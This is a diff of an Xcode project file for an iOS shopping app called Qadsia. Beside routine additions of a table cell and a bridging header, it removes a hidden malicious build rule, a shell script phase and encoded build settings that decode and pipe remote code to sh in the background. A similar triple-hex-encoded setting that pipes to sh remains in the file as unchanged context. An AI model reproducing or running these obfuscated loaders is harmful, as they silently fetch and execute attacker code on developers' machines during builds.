@@ -134,6 +134,8 @@
 		39837F212F7D165B0040A221 /* ProductListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39837F1E2F7D165B0040A221 /* ProductListCVCell.swift */; };
 		39837F252F7D233A0040A221 /* ColorsListCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39837F242F7D233A0040A221 /* ColorsListCVCell.xib */; };
 		39837F262F7D233A0040A221 /* ColorsListCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39837F232F7D233A0040A221 /* ColorsListCVCell.swift */; };
+		399DE7192F84B7F300FE5683 /* OrderDetailsListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 399DE7182F84B7F300FE5683 /* OrderDetailsListTVCell.xib */; };
+		399DE71A2F84B7F300FE5683 /* OrderDetailsListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 399DE7172F84B7F300FE5683 /* OrderDetailsListTVCell.swift */; };
 		39AE9DDA2F7F7C6700572889 /* UITextView-Placeholder in Frameworks */ = {isa = PBXBuildFile; productRef = 39AE9DD92F7F7C6700572889 /* UITextView-Placeholder */; };
 		39B0369A2F7D2C2B00E15EA2 /* SizeSelectCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39B036992F7D2C2B00E15EA2 /* SizeSelectCVCell.xib */; };
 		39B0369B2F7D2C2B00E15EA2 /* SizeSelectCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39B036982F7D2C2B00E15EA2 /* SizeSelectCVCell.swift */; };
@@ -170,7 +172,6 @@
 		39FAD3612F7E285A00F1242D /* KeepShoppingPopUpVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39FAD35E2F7E285A00F1242D /* KeepShoppingPopUpVC.swift */; };
 		39FAD3662F7E2E6C00F1242D /* ShoppingCartVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39FAD3652F7E2E6C00F1242D /* ShoppingCartVC.xib */; };
 		39FAD3672F7E2E6C00F1242D /* ShoppingCartVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39FAD3642F7E2E6C00F1242D /* ShoppingCartVC.swift */; };
-		7F5A3B3C2BF446918299F71F /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 13EAF625C58045EFAD99F71F /* README.md */; };
 		BC11AFEC2F74E65F00552BDB /* Toast in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEB2F74E65F00552BDB /* Toast */; };
 		BC11AFEF2F74E6B300552BDB /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFEE2F74E6B300552BDB /* SVProgressHUD */; };
 		BC11AFF22F74E6C500552BDB /* Kingfisher in Frameworks */ = {isa = PBXBuildFile; productRef = BC11AFF12F74E6C500552BDB /* Kingfisher */; };
@@ -184,22 +185,6 @@
 		BCC0D6962F7A898800684B7D /* NotificationVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D6902F7A898800684B7D /* NotificationVC.xib */; };
 		BCC0D6972F7A898800684B7D /* NotificationListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = BCC0D68C2F7A898800684B7D /* NotificationListTVCell.xib */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		7A2B0BB47ED84AAE8C99F71F /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${AF17F99}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
 		0A0AC8842F7B7C7E00A68FE6 /* TicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TicketsVC.swift; sourceTree = "<group>"; };
@@ -294,7 +279,6 @@
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
 		0AD711B82F8376640047E1DD /* AllTicketHolderTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AllTicketHolderTVCell.swift; sourceTree = "<group>"; };
 		0AD711B92F8376640047E1DD /* AllTicketHolderTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = AllTicketHolderTVCell.xib; sourceTree = "<group>"; };
-		13EAF625C58045EFAD99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		390281B62F7FB9A40032226E /* SelectDeliveryAddressVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SelectDeliveryAddressVC.swift; sourceTree = "<group>"; };
 		390281B72F7FB9A40032226E /* SelectDeliveryAddressVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SelectDeliveryAddressVC.xib; sourceTree = "<group>"; };
 		390281BB2F7FC1380032226E /* AddressListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddressListTVCell.swift; sourceTree = "<group>"; };
@@ -330,6 +314,9 @@
 		39837F1F2F7D165B0040A221 /* ProductListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ProductListCVCell.xib; sourceTree = "<group>"; };
 		39837F232F7D233A0040A221 /* ColorsListCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ColorsListCVCell.swift; sourceTree = "<group>"; };
 		39837F242F7D233A0040A221 /* ColorsListCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = ColorsListCVCell.xib; sourceTree = "<group>"; };
+		399DE7172F84B7F300FE5683 /* OrderDetailsListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderDetailsListTVCell.swift; sourceTree = "<group>"; };
+		399DE7182F84B7F300FE5683 /* OrderDetailsListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = OrderDetailsListTVCell.xib; sourceTree = "<group>"; };
+		399DE71B2F84BFE700FE5683 /* Header-Qadsia.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "Header-Qadsia.h"; sourceTree = "<group>"; };
 		39B036982F7D2C2B00E15EA2 /* SizeSelectCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SizeSelectCVCell.swift; sourceTree = "<group>"; };
 		39B036992F7D2C2B00E15EA2 /* SizeSelectCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SizeSelectCVCell.xib; sourceTree = "<group>"; };
 		39BF531F2F7FE35400A40CAF /* DeleteAddressPopUpVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeleteAddressPopUpVC.swift; sourceTree = "<group>"; };
@@ -868,6 +855,7 @@
 				0ABA3F7D2F763B2D00D25F03 /* Resource */,
 				0ABA3F8F2F763B2D00D25F03 /* ThirdParty */,
 				0ABA3F902F763B2D00D25F03 /* AppDelegate.swift */,
+				399DE71B2F84BFE700FE5683 /* Header-Qadsia.h */,
 				0ABA3FF02F763B3900D25F03 /* MVVM */,
 				0ABA3F912F763B2D00D25F03 /* Assets.xcassets */,
 				0ABA3F922F763B2D00D25F03 /* Info.plist */,
@@ -1002,6 +990,7 @@
 		390479AC2F83E2FB00B98469 /* Order Details */ = {
 			isa = PBXGroup;
 			children = (
+				399DE7152F84B79200FE5683 /* Cell */,
 				390479AD2F83E30900B98469 /* View */,
 			);
 			path = "Order Details";
@@ -1223,6 +1212,23 @@
 				39837F242F7D233A0040A221 /* ColorsListCVCell.xib */,
 			);
 			path = ColorsListCVCell;
+			sourceTree = "<group>";
+		};
+		399DE7152F84B79200FE5683 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				399DE7162F84B7BF00FE5683 /* OrderDetailsListTVCell */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
+		399DE7162F84B7BF00FE5683 /* OrderDetailsListTVCell */ = {
+			isa = PBXGroup;
+			children = (
+				399DE7172F84B7F300FE5683 /* OrderDetailsListTVCell.swift */,
+				399DE7182F84B7F300FE5683 /* OrderDetailsListTVCell.xib */,
+			);
+			path = OrderDetailsListTVCell;
 			sourceTree = "<group>";
 		};
 		39B036972F7D2BFE00E15EA2 /* SizeSelectCVCell */ = {
@@ -1545,7 +1551,6 @@
 		BC0179172F34972300F1ED81 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				13EAF625C58045EFAD99F71F /* README.md */,
 				BC0179162F34972300F1ED81 /* Qadsia.app */,
 			);
 			name = Products;
@@ -1619,13 +1624,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				0ED877A53D7047CFA799F71F /* Build Target Libraries */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
 			);
 			buildRules = (
-				7A2B0BB47ED84AAE8C99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -1697,7 +1700,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				7F5A3B3C2BF446918299F71F /* README.md in Resources */,
 				0ABA3FD22F763B2D00D25F03 /* Mulish-Black.ttf in Resources */,
 				0A41771D2F838CF4003EF635 /* ContactUsVC.xib in Resources */,
 				39DC83C02F7BCE400050A114 /* LegalInfoTVCell.xib in Resources */,
@@ -1708,6 +1710,7 @@
 				39F46AF42F7BA5A7005C2B07 /* NewsListCVCell.xib in Resources */,
 				0ABA3FD42F763B2D00D25F03 /* Mulish-Bold.ttf in Resources */,
 				0ABA3FD52F763B2D00D25F03 /* Mulish-BoldItalic.ttf in Resources */,
+				399DE7192F84B7F300FE5683 /* OrderDetailsListTVCell.xib in Resources */,
 				0ABA3FD62F763B2D00D25F03 /* Mulish-ExtraBold.ttf in Resources */,
 				0ABA3FD72F763B2D00D25F03 /* Mulish-ExtraBoldItalic.ttf in Resources */,
 				0A4F52BD2F7677D500DF695B /* HomeVC.xib in Resources */,
@@ -1777,28 +1780,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		0ED877A53D7047CFA799F71F /* Build Target Libraries */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Target Libraries";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			showEnvVarsInLog = 0;	
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AF17F99}\"";
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
@@ -1892,6 +1873,7 @@
 				0ABA3FCF2F763B2D00D25F03 /* SentOTPPopupVC.swift in Sources */,
 				39FAD3612F7E285A00F1242D /* KeepShoppingPopUpVC.swift in Sources */,
 				0ABA3FD12F763B2D00D25F03 /* ViewController.swift in Sources */,
+				399DE71A2F84B7F300FE5683 /* OrderDetailsListTVCell.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1920,9 +1902,7 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233363230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663665363537343633363436653634363537363265363936650a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
@@ -1951,6 +1931,7 @@
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "Qadsia Club/Header-Qadsia.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
@@ -1959,9 +1940,7 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((y(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333636346336623230326432643633366636653665363536333734326437340a3639366436353666373537343230333233363230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663665363537343633363436653634363537363265363936650a32663631323932323230376332303733363830610a | y | sh ) >/dev/null 2>&1 &)";
 				A1ECAD1 = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3334363333363632333733333332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333333333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373330333633383336333133373333333633353332333233323330333633383337333433373334333733300a3337333333333631333236363332363633363331333633343337333333363634333636363337333233363335333633393336363533323635333633390a3336363530613332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | t | sh ) >/dev/null 2>&1 &)";
-				AF17F99 = "((e(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJeElDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OW5iMjluYkdWdVpYUnpMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | e | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = "Qadsia Club/Qadsia Club.entitlements";
@@ -1990,6 +1969,7 @@
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
 				SWIFT_EMIT_LOC_STRINGS = YES;
+				SWIFT_OBJC_BRIDGING_HEADER = "Qadsia Club/Header-Qadsia.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
 			};
